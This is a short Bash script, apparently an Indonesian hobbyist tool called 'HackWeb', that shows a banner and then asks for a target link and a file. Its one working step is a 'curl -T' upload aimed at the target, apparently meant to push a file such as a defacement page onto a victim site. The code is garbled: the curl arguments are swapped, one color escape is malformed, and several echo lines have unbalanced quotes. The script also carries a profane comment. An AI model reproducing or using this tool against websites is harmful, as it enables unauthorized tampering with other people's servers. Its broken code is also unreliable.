#!/bin/bash
#yang recode kaya kontolllllllllllll
echo -e "/e1;31mMasukan Nama Anda : "
read nama
figlet "HackWeb"
echo ""
echo -e "\e[1;35m                ##############################################"
echo -e "\e[1;34m                |          Autor : CyberLimit"               |
echo -e "\e[1;34m                |         My Team : wisnu|panjull"           |
echo -e "\e[1;34m                |         youtube : Limit Official           |
echo "                           |                                            | "
echo -e "\e[1;34m                |         JANGAN SALAH GUNAKAN TOOLS         |
echo -e "\e[1;35m                ##############################################"
echo ""
echo " Note : Hargai Yang Membuat Tools "
echo ""
echo -e "\e[1;36mMASUKAN LINK TARGET KAMU : "
read target
sleep 1
echo -e "\e[1;35mMasukan File Kamu : "
read file 
sleep 2 
echo -e "\e[1;34mPlease Wait..."
sleep 3
curl -T /sdcard/$target $file
